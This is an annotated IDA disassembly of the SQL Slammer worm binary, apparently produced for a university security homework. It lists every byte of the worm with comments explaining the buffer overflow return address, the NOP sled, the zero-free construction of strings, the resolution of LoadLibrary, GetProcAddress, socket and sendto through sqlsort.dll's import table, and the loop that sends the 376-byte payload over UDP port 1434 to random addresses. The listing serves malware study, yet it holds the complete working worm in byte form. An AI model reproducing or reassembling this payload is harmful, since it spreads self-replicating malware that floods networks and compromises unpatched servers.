seg000:00000000                   ;
seg000:00000000                   ; +-------------------------------------------------------------------------+
seg000:00000000                   ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:00000000                   ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
seg000:00000000                   ; |                      License info: 48-BABB-7E64-E2                      |
seg000:00000000                   ; |                     Georgia Institute of Technology                     |
seg000:00000000                   ; +-------------------------------------------------------------------------+
seg000:00000000                   ;
seg000:00000000                   ; Input SHA256 : 4F22864414F474843EB1E4599185E31D51C5B4AEFDE63B4DC5A850A39AEFF3CB
seg000:00000000                   ; Input MD5    : A0AA4A74B70CBCA5A03960DF1A3DC878
seg000:00000000                   ; Input CRC32  : 4660912C
seg000:00000000
seg000:00000000                   ; File Name   : /nethome/hmiyaziwala3/4894/HW4/W32.SQLSlammer.worm
seg000:00000000                   ; Format      : Binary file
seg000:00000000                   ; Base Address: 0000h Range: 0000h - 0178h Loaded length: 0178h
seg000:00000000
seg000:00000000                                   .686p
seg000:00000000                                   .mmx
seg000:00000000                                   .model flat
seg000:00000000
seg000:00000000                   ; ===========================================================================
seg000:00000000
seg000:00000000                   ; Segment type: Pure code
seg000:00000000                   seg000          segment byte public 'CODE' use32
seg000:00000000                                   assume cs:seg000
seg000:00000000                                   assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:00000000 04                                db    4
seg000:00000001 01                                db    1
seg000:00000002 01                                db    1
seg000:00000003 01                                db    1
seg000:00000004 01                                db    1
seg000:00000005 01                                db    1
seg000:00000006 01                                db    1
seg000:00000007 01                                db    1
seg000:00000008 01                                db    1
seg000:00000009 01                                db    1
seg000:0000000A 01                                db    1
seg000:0000000B 01                                db    1
seg000:0000000C 01                                db    1
seg000:0000000D 01                                db    1
seg000:0000000E 01                                db    1
seg000:0000000F 01                                db    1
seg000:00000010 01                                db    1
seg000:00000011 01                                db    1
seg000:00000012 01                                db    1
seg000:00000013 01                                db    1
seg000:00000014 01                                db    1
seg000:00000015 01                                db    1
seg000:00000016 01                                db    1
seg000:00000017 01                                db    1
seg000:00000018 01                                db    1
seg000:00000019 01                                db    1
seg000:0000001A 01                                db    1
seg000:0000001B 01                                db    1
seg000:0000001C 01                                db    1
seg000:0000001D 01                                db    1
seg000:0000001E 01                                db    1
seg000:0000001F 01                                db    1
seg000:00000020 01                                db    1
seg000:00000021 01                                db    1
seg000:00000022 01                                db    1
seg000:00000023 01                                db    1
seg000:00000024 01                                db    1
seg000:00000025 01                                db    1
seg000:00000026 01                                db    1
seg000:00000027 01                                db    1
seg000:00000028 01                                db    1
seg000:00000029 01                                db    1
seg000:0000002A 01                                db    1
seg000:0000002B 01                                db    1
seg000:0000002C 01                                db    1
seg000:0000002D 01                                db    1
seg000:0000002E 01                                db    1
seg000:0000002F 01                                db    1
seg000:00000030 01                                db    1
seg000:00000031 01                                db    1
seg000:00000032 01                                db    1
seg000:00000033 01                                db    1
seg000:00000034 01                                db    1
seg000:00000035 01                                db    1
seg000:00000036 01                                db    1
seg000:00000037 01                                db    1
seg000:00000038 01                                db    1
seg000:00000039 01                                db    1
seg000:0000003A 01                                db    1
seg000:0000003B 01                                db    1
seg000:0000003C 01                                db    1
seg000:0000003D 01                                db    1
seg000:0000003E 01                                db    1
seg000:0000003F 01                                db    1
seg000:00000040 01                                db    1
seg000:00000041 01                                db    1
seg000:00000042 01                                db    1
seg000:00000043 01                                db    1
seg000:00000044 01                                db    1
seg000:00000045 01                                db    1
seg000:00000046 01                                db    1
seg000:00000047 01                                db    1
seg000:00000048 01                                db    1
seg000:00000049 01                                db    1
seg000:0000004A 01                                db    1
seg000:0000004B 01                                db    1
seg000:0000004C 01                                db    1
seg000:0000004D 01                                db    1
seg000:0000004E 01                                db    1
seg000:0000004F 01                                db    1
seg000:00000050 01                                db    1
seg000:00000051 01                                db    1
seg000:00000052 01                                db    1
seg000:00000053 01                                db    1
seg000:00000054 01                                db    1
seg000:00000055 01                                db    1
seg000:00000056 01                                db    1
seg000:00000057 01                                db    1
seg000:00000058 01                                db    1
seg000:00000059 01                                db    1
seg000:0000005A 01                                db    1
seg000:0000005B 01                                db    1
seg000:0000005C 01                                db    1
seg000:0000005D 01                                db    1
seg000:0000005E 01                                db    1
seg000:0000005F 01                                db    1
seg000:00000060 01                                db    1
seg000:00000061 DC C9 B0 42                       db 0DCh, 0C9h, 0B0h, 42h ; return address that is overwritten to point into sqlsort's jump esp
seg000:00000065                   ; ---------------------------------------------------------------------------
seg000:00000065 EB 0E                             jmp     short loc_75    ; go to beginning of worm
seg000:00000065                   ; ---------------------------------------------------------------------------
seg000:00000067 01                                db    1
seg000:00000068 01                                db    1
seg000:00000069 01                                db    1
seg000:0000006A 01                                db    1
seg000:0000006B 01                                db    1
seg000:0000006C 01                                db    1
seg000:0000006D 01                                db    1
seg000:0000006E 70                                db  70h ; p
seg000:0000006F AE                                db 0AEh
seg000:00000070 42                                db  42h ; B
seg000:00000071 01                                db    1
seg000:00000072 70                                db  70h ; p
seg000:00000073 AE                                db 0AEh
seg000:00000074 42                                db  42h ; B
seg000:00000075                   ; ---------------------------------------------------------------------------
seg000:00000075
seg000:00000075                   loc_75:                                 ; CODE XREF: seg000:00000065↑j
seg000:00000075 90                                nop                     ; nop sled
seg000:00000076 90                                nop
seg000:00000077 90                                nop
seg000:00000078 90                                nop
seg000:00000079 90                                nop
seg000:0000007A 90                                nop
seg000:0000007B 90                                nop
seg000:0000007C 90                                nop
seg000:0000007D 68 DC C9 B0 42                    push    42B0C9DCh       ; [EBP - 4] save EIP(for Sqlsort.dll) onto stack (the jmp esp command that worm came from, worm is already here)
seg000:00000082 B8 01 01 01 01                    mov     eax, 1010101h   ; fixing up worm (payload buffer corrupted during execution), recreating the "garbage" at the beginning by pushing "10"s onto the stack. Equates to: add [ecx], eax. Can't put just 0's because those are removed automatically.
seg000:00000087 31 C9                             xor     ecx, ecx        ; zeroing out loop counter
seg000:00000089 B1 18                             mov     cl, 18h         ; setting loop counter to 18h
seg000:0000008B
seg000:0000008B                   loc_8B:                                 ; CODE XREF: seg000:0000008C↓j
seg000:0000008B 50                                push    eax             ; pushing "1010101h" onto the stack
seg000:0000008C E2 FD                             loop    loc_8B          ; executing loop
seg000:0000008E 35 01 01 01 05                    xor     eax, 5010101h   ; = 4000000,(0x4 is the query type) denotes 'real' beginning of worm. XORs are used throughout to not use any zeroes which would cause issues/be removed by the sprintf replication
seg000:00000093 50                                push    eax             ; [EBP-64] pushed to stack
seg000:00000094 89 E5                             mov     ebp, esp        ; resetting bp to sp
seg000:00000096 51                                push    ecx             ; terminating null pushed to stack (remnant from counter loop). All in reverse because API will read from bottom of the stack. Setting up stack frame to store following strings:
seg000:00000097 68 2E 64 6C 6C                    push    6C6C642Eh       ; [EBP-10h] "kernel32.dll"
seg000:0000009C 68 65 6C 33 32                    push    32336C65h       ; ...
seg000:000000A1 68 6B 65 72 6E                    push    6E72656Bh       ; ...
seg000:000000A6 51                                push    ecx             ; terminating null
seg000:000000A7 68 6F 75 6E 74                    push    746E756Fh       ; [EBP-20h] "GetTickCount"
seg000:000000AC 68 69 63 6B 43                    push    436B6369h       ; ...
seg000:000000B1 68 47 65 74 54                    push    54746547h       ; ...
seg000:000000B6 66 B9 6C 6C                       mov     cx, 6C6Ch       ; partially loading cx, still contains terminating null
seg000:000000BA 51                                push    ecx             ; pushing above^
seg000:000000BB 68 33 32 2E 64                    push    642E3233h       ; [EBP-2Ch] "ws2_32.dll"
seg000:000000C0 68 77 73 32 5F                    push    5F327377h       ; ...
seg000:000000C5 66 B9 65 74                       mov     cx, 7465h       ; partially loading cx, still contains terminating null
seg000:000000C9 51                                push    ecx             ; pushing^
seg000:000000CA 68 73 6F 63 6B                    push    6B636F73h       ; [EBP-34h] "socket"
seg000:000000CF 66 B9 74 6F                       mov     cx, 6F74h       ; partially loading cx, still contains terminating null
seg000:000000D3 51                                push    ecx             ; pushing above^
seg000:000000D4 68 73 65 6E 64                    push    646E6573h       ; [EBP-3Ch] "sendto"
seg000:000000D9 BE 18 10 AE 42                    mov     esi, 42AE1018h  ; sqlsort.dll->IAT->LoadLibrary (grab the load library function from sqlsort's Import Address Table)
seg000:000000DE 8D 45 D4                          lea     eax, [ebp-2Ch]  ; grab address of "ws_32.dll"
seg000:000000E1 50                                push    eax             ; push pointer to stack
seg000:000000E2 FF 16                             call    dword ptr [esi] ; Load the library (ws_32.dll)
seg000:000000E4 50                                push    eax             ; push the handle to the stack
seg000:000000E5 8D 45 E0                          lea     eax, [ebp-20h]  ; grab address of "GetTickCount"
seg000:000000E8 50                                push    eax             ; push it to stack, will be used as an argument
seg000:000000E9 8D 45 F0                          lea     eax, [ebp-10h]  ; load address of string "kernel32.dll"
seg000:000000EC 50                                push    eax             ; push it to the stack
seg000:000000ED FF 16                             call    dword ptr [esi] ; Load the library kernel32.dll
seg000:000000EF 50                                push    eax             ; [EBP - 40] Save handle to stack
seg000:000000F0 BE 10 10 AE 42                    mov     esi, 42AE1010h  ; Set esi to the "top" of the IAT, we are trying to find GetProcAddress
seg000:000000F5 8B 1E                             mov     ebx, [esi]      ; move IAT entry into ebx
seg000:000000F7 8B 03                             mov     eax, [ebx]      ; copy word into EAX
seg000:000000F9 3D 55 8B EC 51                    cmp     eax, 51EC8B55h  ; fingerprinting GetProcAddress
seg000:000000FE 74 05                             jz      short loc_105   ; if valid, jump
seg000:00000100 BE 1C 10 AE 42                    mov     esi, 42AE101Ch  ; if invalid, worm is dealing with the other SQL Server
seg000:00000105
seg000:00000105                   loc_105:                                ; CODE XREF: seg000:000000FE↑j
seg000:00000105 FF 16                             call    dword ptr [esi] ; call GetProcAddress using parameters(kernel32.dll's pointer and GetTickCount)
seg000:00000107 FF D0                             call    eax             ; call GetTickCount (seed for Random Number Generator, obtained from return address of GetProcAddress)
seg000:00000109 31 C9                             xor     ecx, ecx        ; zeroes out ecx
seg000:0000010B 51                                push    ecx             ; buffer word in stack
seg000:0000010C 51                                push    ecx             ; anoter buffer word in stack
seg000:0000010D 50                                push    eax             ; [EBP-4Ch] saves result of GetTickCount (seed) to the stack
seg000:0000010E 81 F1 03 01 04 9B                 xor     ecx, 9B040103h  ; ecx = 9b040103
seg000:00000114 81 F1 01 01 01 01                 xor     ecx, 1010101h   ; ecx = 9A050002
seg000:0000011A 51                                push    ecx             ; [EBP-50h] preparing the sockadd_in struct: sin_family = 2 (AF_INET), port = 1434
seg000:0000011B 8D 45 CC                          lea     eax, [ebp-34h]  ; grab "socket" string address
seg000:0000011E 50                                push    eax             ; push it to stack
seg000:0000011F 8B 45 C0                          mov     eax, [ebp-40h]  ; Grab handle of ws2_32.dll
seg000:00000122 50                                push    eax             ; push it to the stack
seg000:00000123 FF 16                             call    dword ptr [esi] ; Call GetProcAddress using parameters "socket" and ws2_32.dll
seg000:00000125 6A 11                             push    11h             ; Begin creating UDP socket: IPPROTO_UDP - declares udp
seg000:00000127 6A 02                             push    2               ; SOCK_DGRAM - Datagram Socket
seg000:00000129 6A 02                             push    2               ; AF_INET - Internet Address Family
seg000:0000012B FF D0                             call    eax             ; Call Create Socket
seg000:0000012D 50                                push    eax             ; [EBP-54h] push descriptor to stack frame
seg000:0000012E 8D 45 C4                          lea     eax, [ebp-3Ch]  ; Grabs "sendto" string address
seg000:00000131 50                                push    eax             ; Puts onto stack
seg000:00000132 8B 45 C0                          mov     eax, [ebp-40h]  ; Grabs handle of ws2_32.dll
seg000:00000135 50                                push    eax             ; Puts onto stack
seg000:00000136 FF 16                             call    dword ptr [esi] ; Calls GetProcAddress with parameters "sendto" and ws3_32.dll
seg000:00000138 89 C6                             mov     esi, eax        ; sets esi to sendto's address (return value of call)
seg000:0000013A 09 DB                             or      ebx, ebx        ; should have been an xor? this doesn't do anything. Keeps ebx to be the IAT's entry point
seg000:0000013C 81 F3 3C 61 D9 FF                 xor     ebx, 0FFD9613Ch ; xored with this value, preparing for random IP progation
seg000:00000142
seg000:00000142                   loc_142:                                ; CODE XREF: seg000:00000176↓j
seg000:00000142 8B 45 B4                          mov     eax, [ebp-4Ch]  ; Grab "random seed" generated from GetTickCount
seg000:00000145 8D 0C 40                          lea     ecx, [eax+eax*2] ; Jumble it up: ECX = EAC * 3
seg000:00000148 8D 14 88                          lea     edx, [eax+ecx*4] ; EDX = ECX * 4 + EAX
seg000:0000014B C1 E2 04                          shl     edx, 4          ; EDX << 4
seg000:0000014E 01 C2                             add     edx, eax        ; EDX += EAX
seg000:00000150 C1 E2 08                          shl     edx, 8          ; EDX << 8
seg000:00000153 29 C2                             sub     edx, eax        ; EDX -= EAX
seg000:00000155 8D 04 90                          lea     eax, [eax+edx*4] ; EDX+=EDX*4
seg000:00000158 01 D8                             add     eax, ebx        ; EAX += EBX
seg000:0000015A 89 45 B4                          mov     [ebp-4Ch], eax  ; replace old seed with this new one
seg000:0000015D 6A 10                             push    10h             ; begin preparing SENDTO call, push tolen = 10h (struct is 16 bytes)
seg000:0000015F 8D 45 B0                          lea     eax, [ebp-50h]  ; get sockaddr_in structure. Aligned such that the random number generated above lines up to be the sin_addr (destination ip)
seg000:00000162 50                                push    eax             ; push onto stack
seg000:00000163 31 C9                             xor     ecx, ecx        ; zero out ecx
seg000:00000165 51                                push    ecx             ; don't send any flags (0)
seg000:00000166 66 81 F1 78 01                    xor     cx, 376         ; packet length (this worm is exactly 178h bytes)
seg000:0000016B 51                                push    ecx             ; push onto stack
seg000:0000016C 8D 45 03                          lea     eax, [ebp+3]    ; Push address of buffer that was sent to the server to cause overflow (basically - the worm)
seg000:0000016F 50                                push    eax             ; Push buffer onto stack
seg000:00000170 8B 45 AC                          mov     eax, [ebp-54h]  ; Grab socket descriptor from Socket call
seg000:00000173 50                                push    eax             ; push onto stack
seg000:00000174 FF D6                             call    esi             ; Execute the sendto procedure
seg000:00000176 EB CA                             jmp     short loc_142   ; Repeat, jump back to the seed generator and continue to send out packets to new random ips
seg000:00000176                   seg000          ends
seg000:00000176
seg000:00000176
seg000:00000176                                   end
